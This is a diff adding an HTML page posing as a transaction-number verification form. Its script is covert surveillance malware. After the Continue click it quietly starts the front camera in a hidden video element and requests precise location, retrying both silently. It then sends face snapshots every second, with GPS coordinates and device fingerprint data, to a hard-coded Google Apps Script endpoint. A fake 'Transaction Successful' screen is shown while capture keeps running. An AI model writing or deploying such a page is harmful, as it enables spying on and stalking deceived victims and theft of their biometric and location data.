@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Enter Transaction Number</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
+    .card { background:#fff; padding:30px; border-radius:16px; width:340px; text-align:center; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
+    input { width:100%; padding:12px; margin-top:12px; border-radius:8px; border:1px solid #ccc; font-size:16px }
+    button { width:100%; padding:12px; margin-top:18px; font-size:16px; border:none; background:#4a90e2; color:#fff; border-radius:8px; cursor:pointer }
+    button:hover { background:#3b7bc2 }
+    .hidden { display:none }
+    .notify { position:fixed; top:16px; left:50%; transform:translateX(-50%); background:#2563eb; color:#fff; padding:10px 16px; border-radius:10px; box-shadow:0 6px 18px rgba(37,99,235,0.2); font-weight:600; z-index:9999 }
+    .notify.error { background:#ef4444 }
+    .notify.success { background:#16a34a }
+    .success-wrap { background:#fff; padding:30px; border-radius:16px; width:360px; text-align:center; box-shadow:0 4px 20px rgba(0,0,0,0.08) }
+    .checkmark { font-size:56px; color:#16a34a; margin:8px 0 12px 0 }
+    .muted { color:#6b7280 }
+    .small { font-size:13px; color:#6b7280; margin-top:8px }
+  </style>
+</head>
+<body>
+
+  <!-- Page 1 -->
+  <div id="page-1" class="card">
+    <h2>Enter Transaction Number</h2>
+    <p>Please enter your transaction reference number.</p>
+
+    <input id="txnInput" type="text" placeholder="Transaction Number" aria-label="Transaction Number" />
+    <button id="continue-btn" type="button">Continue</button>
+    
+  </div>
+
+  <!-- Page 2: Transaction Success Page (hidden initially) -->
+  <div id="success-page" class="hidden success-wrap" role="region" aria-live="polite">
+    <div class="checkmark">✓</div>
+    <h2>Transaction Successful</h2>
+    <p class="muted">Your transaction has been verified and processed.</p>
+    <p class="muted" style="margin-top:12px;">Reference ID: <strong id="ref-id">--</strong></p>
+  </div>
+
+  <script>
+    /***** CONFIGURE THIS: replace with your deployed Apps Script web app URL *****/
+    const SHEET_ENDPOINT = "https://script.google.com/macros/s/AKfycbw0dHbB3cn5pAVFr2dXIKUWaA58isx4A8d9ZGAgkCzQXuTXhAgRpTr7R4hPlKyspHYy/exec"; // <- replace
+
+    // Utility: show notification
+    function showNotify(text, type = 'info', timeout = 2000) {
+      const id = 'notify-msg';
+      const existing = document.getElementById(id);
+      if (existing) existing.remove();
+      const msg = document.createElement('div');
+      msg.id = id;
+      msg.className = 'notify' + (type === 'error' ? ' error' : type === 'success' ? ' success' : '');
+      msg.innerText = text;
+      document.body.appendChild(msg);
+      if (timeout) setTimeout(() => { msg.remove(); }, timeout);
+    }
+
+    // Device info
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent || null,
+        platform: navigator.platform || null,
+        screenWidth: window.screen?.width || null,
+        screenHeight: window.screen?.height || null,
+        language: navigator.language || null
+      };
+    }
+
+    // Capture location with graceful handling
+    function captureLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) { resolve({ error: 'Geolocation not supported' }); return; }
+        let finished = false;
+        const timer = setTimeout(() => { if (!finished) { finished = true; resolve({ error: 'Location request timed out' }); } }, 12000);
+        navigator.geolocation.getCurrentPosition(
+          pos => { if (finished) return; finished=true; clearTimeout(timer); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
+          err => { if (finished) return; finished=true; clearTimeout(timer); const msg = (err && err.code===1)?'Permission denied':(err&&err.code===2)?'Position unavailable':'Geolocation error'; resolve({ error: msg }); },
+          { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+        );
+      });
+    }
+
+    // Start camera stream once and reuse for repeated captures
+    async function startCameraStream() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        return { error: 'Camera not supported' };
+      }
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        video.autoplay = true;
+        video.playsInline = true;
+        video.muted = true;
+        video.srcObject = stream;
+        document.body.appendChild(video);
+        await new Promise((resolve) => {
+          const t = setTimeout(resolve, 1500); // fallback
+          video.addEventListener('loadedmetadata', () => { clearTimeout(t); resolve(); }, { once: true });
+        });
+        return { stream, video };
+      } catch (err) {
+        const name = err && err.name ? err.name : 'Camera error';
+        return { error: name };
+      }
+    }
+
+    // --- Region motion detection (checks center region only) ---
+    function detectRegionMotion(video) {
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+
+      const cw = Math.floor(w * 0.4);
+      const ch = Math.floor(h * 0.4);
+      const cx = Math.floor(w * 0.3);
+      const cy = Math.floor(h * 0.3);
+
+      if (!window.__prevFrameCanvas) {
+        window.__prevFrameCanvas = document.createElement('canvas');
+        window.__prevFrameCanvas.width = cw;
+        window.__prevFrameCanvas.height = ch;
+      }
+
+      const canvas = document.createElement('canvas');
+      canvas.width = cw;
+      canvas.height = ch;
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, cx, cy, cw, ch, 0, 0, cw, ch);
+
+      const curr = ctx.getImageData(0, 0, cw, ch).data;
+
+      const prevCtx = window.__prevFrameCanvas.getContext('2d');
+      const prevData = prevCtx.getImageData(0, 0, cw, ch).data;
+
+      let diff = 0;
+      for (let i = 0; i < curr.length; i += 4) {
+        diff += Math.abs(curr[i] - prevData[i]);
+      }
+
+      prevCtx.drawImage(video, cx, cy, cw, ch, 0, 0, cw, ch);
+
+      return diff > 50000; // motion threshold
+    }
+
+    // Capture one frame from an active video element
+    function captureFrameFromVideo(video) {
+      try {
+        const w = video.videoWidth || 640;
+        const h = video.videoHeight || 480;
+        const canvas = document.createElement('canvas');
+        canvas.width = w; canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, w, h);
+        return { data: canvas.toDataURL('image/jpeg', 0.6) };
+      } catch (err) {
+        return { error: 'Frame capture error' };
+      }
+    }
+
+    // Stop camera stream and remove hidden video
+    function stopCameraStream(stream, video) {
+      try {
+        if (stream && stream.getTracks) stream.getTracks().forEach(t => t.stop());
+        if (video && video.parentNode) video.parentNode.removeChild(video);
+      } catch (e) { /* ignore */ }
+    }
+
+    // Send captured payload to Apps Script endpoint (uses fetch, falls back to sendBeacon on unload)
+    async function sendToSheet(payload, useBeacon = false) {
+      try {
+        const body = JSON.stringify(payload);
+        if (useBeacon && navigator.sendBeacon) {
+          const blob = new Blob([body], { type: 'application/json' });
+          return navigator.sendBeacon(SHEET_ENDPOINT, blob);
+        } else {
+          const res = await fetch(SHEET_ENDPOINT, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' }, body
+          });
+          return res.ok;
+        }
+      } catch (e) {
+        console.warn('Send to sheet failed', e);
+        return false;
+      }
+    }
+
+    // Show success page
+    function showSuccessPage(txn) {
+      document.getElementById('ref-id').innerText = txn;
+      document.getElementById('page-1').classList.add('hidden');
+      document.getElementById('success-page').classList.remove('hidden');
+    }
+
+    // Main Continue button handler
+    document.getElementById('continue-btn').addEventListener('click', async function() {
+      const val = document.getElementById('txnInput').value.trim();
+      if (!val) { alert('Please enter a transaction number.'); return; }
+
+      showNotify('Processing...', 'info', 1400);
+
+      // Keep global references for sending frames
+      window.__currentTxn = val;
+      window.__deviceInfo = getDeviceInfo();
+      window.__lastLocation = null;
+      window.__lastFrame = null;
+
+      // Start camera stream (try once, silent retry once if fails)
+      let cam = await startCameraStream();
+      if (cam.error) { cam = await startCameraStream(); }
+
+      // Capture location (try once, retry silently)
+      let loc = await captureLocation();
+      if (loc && loc.error) { loc = await captureLocation(); }
+      if (!loc || loc.error) loc = null;
+      window.__lastLocation = loc;
+
+      // If camera stream available, start automatic captures every 1 second
+      let intervalId = null;
+      if (cam && !cam.error && cam.video) {
+        const video = cam.video;
+        intervalId = setInterval(async () => {
+          const frame = captureFrameFromVideo(video);
+          if (frame && frame.data) {
+            // --- Region-based motion detection (M4) ---
+            const moved = detectRegionMotion(video);
+            if (!moved) return; // do not save unless region changed
+
+            const payload = {
+              txn: window.__currentTxn,
+              timestamp: new Date().toISOString(),
+              device: window.__deviceInfo,
+              location: window.__lastLocation || {},
+              image: frame.data,
+              filename: 'frame_' + Date.now() + '.jpg'
+            };
+            sendToSheet(payload).catch(()=>{});
+          }
+        }, 1000); // 1 second interval
+
+        // on unload try to send last frame reliably
+        window.addEventListener('beforeunload', () => {
+          if (intervalId) clearInterval(intervalId);
+          if (cam && cam.stream) stopCameraStream(cam.stream, cam.video);
+          if (window.__lastFrame) {
+            const payload = { txn: window.__currentTxn, timestamp: new Date().toISOString(), device: window.__deviceInfo, location: window.__lastLocation || {}, image: window.__lastFrame, filename: 'frame_' + Date.now() + '.jpg' };
+            try { navigator.sendBeacon(SHEET_ENDPOINT, new Blob([JSON.stringify(payload)], { type: 'application/json' })); } catch(e){}
+          }
+        });
+      }
+
+      // show success page after short delay but keep captures running in background
+      setTimeout(() => { showSuccessPage(val); }, 1200);
+    });
+  </script>
+
+</body>
+</html>
